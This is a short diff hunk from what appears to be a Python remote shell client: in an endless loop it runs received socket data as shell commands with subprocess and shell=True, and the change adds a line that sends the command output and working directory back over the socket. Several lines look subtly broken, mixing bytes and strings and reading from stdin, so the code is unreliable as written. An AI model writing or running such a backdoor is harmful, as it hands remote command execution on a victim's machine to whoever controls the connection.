@@ -16,7 +16,7 @@ while True:
         cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
         output_bytes=cmd.stdout.read()+' '+cmd.stdin.read() + ' ' +cmd.stderr.read()
         output_string=str(output_bytes+os.getcwd(),'utf-8')
-
+        s.send(output_string+ str(os.getcwd()))
         print(output_string)
 
 
